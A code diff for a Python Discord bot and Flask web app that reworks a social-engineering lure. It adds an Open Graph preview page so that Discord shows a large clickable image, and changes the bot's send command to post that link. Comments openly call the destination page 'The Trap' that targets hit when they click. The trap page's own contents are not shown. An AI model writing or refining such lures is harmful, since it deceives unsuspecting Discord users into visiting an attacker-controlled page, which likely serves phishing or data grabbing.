@@ -5,7 +5,7 @@ import requests
 import threading
 import discord
 from discord.ext import commands
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, send_file
 
 _orig_getaddrinfo = socket.getaddrinfo
 def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
@@ -18,6 +18,33 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 
+# 1. The page Discord crawls to build the image preview
+@app.route('/preview')
+def preview():
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="Click to view">
+        <!-- This makes Discord show the giant image -->
+        <meta property="og:image" content="https://rnbw-production.up.railway.app/image.png">
+        <meta property="og:image:width" content="400">
+        <meta property="og:image:height" content="400">
+    </head>
+    <body></body>
+    </html>
+    """
+
+# 2. The image itself
+@app.route('/image.png')
+def serve_image():
+    try:
+        return send_file("image.png", mimetype='image/png')
+    except:
+        return "Image not found", 404
+
+# 3. The Trap (when they click the image, they hit this)
 @app.route('/')
 def index():
     return render_template_string("""
@@ -73,21 +100,10 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    try:
-        # Load your image
-        file = discord.File("image.png", filename="SPOILER_image.png")
-    except:
-        await ctx.send("Error: Could not find image.png in the repo.")
-        return
-
-    # Create an embed with NO text. The URL goes to your trap.
-    embed = discord.Embed(url=RAILWAY_URL)
-    
-    # Attach the spoiler image
-    embed.set_image(url="attachment://SPOILER_image.png")
-
-    # Send it. The image is blurred. The whole image is a clickable link.
-    await ctx.send(embed=embed, file=file)
+    # We send a link to the preview.
+    # Discord will crawl it, see the og:image, and build a massive clickable image.
+    # When they click that image, it routes to the root URL ('/'), which is the trap.
+    await ctx.send(f"<{RAILWAY_URL}/preview>")
 
 def run_bot():
     if not BOT_TOKEN:
